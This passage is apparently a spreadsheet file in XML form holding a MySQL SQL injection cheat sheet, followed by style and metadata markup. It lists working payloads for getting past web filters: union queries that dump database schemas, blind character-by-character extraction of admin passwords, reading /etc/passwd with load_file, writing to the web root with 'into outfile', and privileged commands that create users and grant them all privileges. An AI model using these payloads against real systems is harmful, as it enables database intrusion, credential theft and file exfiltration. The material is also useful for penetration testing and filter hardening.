          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Hostname, IP address</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT @@hostname;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Create users (priv)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>CREATE USER test1 IDENTIFIED BY ‘pass1′;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Delete users (priv)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>DROP USER test1;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Make user DBA (priv)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>GRANT ALL PRIVILEGES ON *.* TO test1@’%';</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Location of DB files</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT @@datadir;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Default/System Databases</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>information_schema (&gt;= mysql 5.0)</text:p>
            <text:p>Mysql</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1" table:number-rows-repeated="2">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro8">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>8 – Obfuscation and Filter Evasion</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Most of these techniques are already scattered throughout </text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>White spaces using paranthesis</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>(1)and(1)=(0)union(select(null),table_name,(null)from(information_schema.tables)limit 28,1-- -)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro15">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>White spaces using paranthesis, substr, mid</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>(1)and(1)=(0)union(select(null),mid(group_concat(table_name),600,100),(null)from(information_schema.tables))#</text:p>
            <text:p/>
            <text:p>(1)and(1)=(0)union(select(null),group_concat(column_name),(null)from(information_schema.columns)where(table_name)=(0x7573657273))#</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro22">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Basic filtering on ‘and’, ‘null’, ‘where’, and ‘limit’.</text:p>
            <text:p>Use &amp;&amp; instead of AND</text:p>
            <text:p>Use || instead of OR</text:p>
            <text:p>%00 instead of # or –</text:p>
            <text:p>HAVING and LIKE help out where possible</text:p>
            <text:p>Cannot use group_concat while using HAVING</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>(0)union(select(0),group_concat(table_name),(0)from(information_schema.tables))#</text:p>
            <text:p/>
            <text:p>(0)union(select(0),group_concat(column_name),(0)from(information_schema.columns))#</text:p>
            <text:p/>
            <text:p>(0)union(select(0),group_concat(schema_name),(0)from(information_schema.schemata))#</text:p>
            <text:p/>
            <text:p>(0)union(select(table_schema),table_name,(0)from(information_schema.tables)having((table_schema)like(0x74657374)))#</text:p>
            <text:p/>
            <text:p>(0)union(select(table_schema),table_name,(0)from(information_schema.tables)having((table_schema)like(0x74657374)&amp;&amp;(table_name)!=(0x7573657273)))#</text:p>
            <text:p/>
            <text:p>(0)union(select(table_name),column_name,(0)from(information_schema.columns)having((table_name)like(0x7573657273)))#</text:p>
            <text:p/>
            <text:p>(0)union(select(table_name),column_name,(0)from(information_schema.columns)having((table_name)like(0x7573657273)&amp;&amp;(column_name)!=(0x6964)))#</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro12">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>More filtering, previous plus ‘having’, ‘group_concat’, ‘union select’</text:p>
            <text:p>can’t output file without union select</text:p>
            <text:p>If file priv, load_file. Check for load_file without null using coalesce</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>(coalesce(length(load_file(0x2F6574632F706173737764)),1))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro19">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Brute reading file char by char using case</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>(case(mid(load_file(0x2F6574632F706173737764),$x,1))when($char)then(1)else(0)end)</text:p>
            <text:p/>
            <text:p>(while $char is the character in sql hex which is compared to the current character of the file at offset $x)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Check char of pass, one by one (or with a specific username)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1&amp;&amp;mid(pass,1,1)=(0x61);%00</text:p>
            <text:p>1||1=1&amp;&amp;name=0x61646D696E&amp;&amp;mid(pass,1,1)=0x61;%00</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>More filtering, including “=”, use LIKE instead</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>1&amp;&amp;(name)like(0x61646D696E)&amp;&amp;(mid(pass,1,1))like(0x61);%00</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Filtering AND and “&amp;&amp;”, use IF statements</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>if((name)like(0x61646D696E),1,0);%00</text:p>
            <text:p>if((name)like(0x61646D696E),id,0);%00</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro23">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Check password chars if AND and &amp;&amp; and more are filtered</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>if(if((name)like(0x61646D696E),1,0),if(mid((password),1,1)like(0x61),id,0),0);%00</text:p>
            <text:p/>
            <text:p>if(</text:p>
            <text:p>  // if (it gets true if the name='admin')</text:p>
            <text:p>    if((name)like(0x61646D696E),1,0),</text:p>
            <text:p>  // then (if first password char='a' return admin id, else 0)</text:p>
            <text:p>    if(mid((password),1,1)like(0x61),id,0),</text:p>
            <text:p>  // else (return 0)</text:p>
            <text:p>    0</text:p>
            <text:p>);%00</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro24">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Unicode <text:a xlink:href="http://dev.mysql.com/doc/refman/5.1/en/charset-unicode-sets.html" xlink:type="simple">(see more)</text:a></text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT 'Ä'='A'; #1</text:p>
            <text:p>SELECT 'Ã'='A'; #1</text:p>
            <text:p/>
            <text:p>SELECT * FROM test WHERE name = 'ädM&amp;#1031;&amp;#328;'; //imagine entities in canonical form</text:p>
            <text:p/>
            <text:p>SELECT*FROM(test)WHERE(name)IN(_ucs2 0x01df010e004d00cf0148);</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>XML SQLi</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Version detection using MySQL Special Exec Comment Syntax</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT--/*!500005#*//*!400004#*//*!300003#*/</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>CONCAT, CHARS, and HEX</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT concat(char(0x70617373),char(2003792484))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>String separation</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>SELECT/*/'a'/*/ 'd'/*/ 'mi'/*/ 'n'</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>OR, AND, UNION</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>‘ and (select pass from users limit 1)=’secret</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>OR, AND, UNION, LIMIT</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>‘ and (select pass from users where id =1)=’a</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>OR, AND, UNION, LIMIT, WHERE</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>‘ and (select pass from users group by id having id = 1)=’a</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>OR, AND, UNION, LIMIT, WHERE, GROUP</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>‘ and length((select pass from users having substr(pass,1,1)=’a'))</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro13">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>OR, AND, UNION, LIMIT, WHERE, GROUP, HAVING</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>‘ and (select substr(group_concat(pass),1,1) from users)=’a</text:p>
            <text:p>‘ and substr((select max(pass) from users),1,1)=’a</text:p>
            <text:p>‘ and substr((select max(replace(pass,’lastpw’,”)) from users),1,1)=’a</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro12">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>OR, AND UNION, LIMIT, WHERE, GROUP, HAVING, SELECT</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>‘ and substr(load_file(‘file’),locate(‘DocumentRoot’,(load_file(‘file’)))+length(‘DocumentRoot’),10)=’a</text:p>
            <text:p>‘=” into outfile ‘/var/www/dump.txt</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro12">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>OR, AND, UNION, LIMIT, WHERE, GROUP, HAVING, SELECT, FILE</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>‘ procedure analyse()#</text:p>
            <text:p>‘-if(name=’Admin’,1,0)#</text:p>
            <text:p>‘-if(if(name=’Admin’,1,0),if(substr(pass,1,1)=’a',1,0),0)#</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1" table:number-rows-repeated="1048378">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">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complex="Noto Sans Devanagari" style:font-family-complex="'Noto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ff"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ffffff"/>
      <style:text-properties fo:color="#006600" fo:font-size="10pt" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="Neutral" style:family="table-cell" style:parent-style-name="Status">
      <style:table-cell-properties fo:background-color="#ffffff"/>
      <style:text-properties fo:color="#996600" fo:font-size="10pt" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="Bad" style:family="table-cell" style:parent-style-name="Status">
      <style:table-cell-properties fo:background-color="#ffffff"/>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ffffff"/>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ffffff"/>
      <style:text-properties fo:color="#ffffff" fo:font-size="10pt" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="Accent_20_2" style:display-name="Accent 2" style:family="table-cell" style:parent-style-name="Accent">
      <style:table-cell-properties fo:background-color="#ffffff"/>
      <style:text-properties fo:color="#ffffff" fo:font-size="10pt" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="Accent_20_3" style:display-name="Accent 3" style:family="table-cell" style:parent-style-name="Accent">
      <style:table-cell-properties fo:background-color="#ffffff"/>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21:04:19.892430956</meta:creation-date>
    <dc:date>2018-02-24T14:46:35.037022105</dc:date>
    <meta:editing-duration>PT3H5M40S</meta:editing-duration>
    <meta:editing-cycles>8</meta:editing-cycles>
    <meta:generator>LibreOffice/6.0.1.1$Linux_X86_64 LibreOffice_project/00m0$Build-1</meta:generator>
    <meta:document-statistic meta:table-count="2" meta:cell-count="425" meta:object-count="0"/>
  </office:meta>
</office:document-meta>
</file>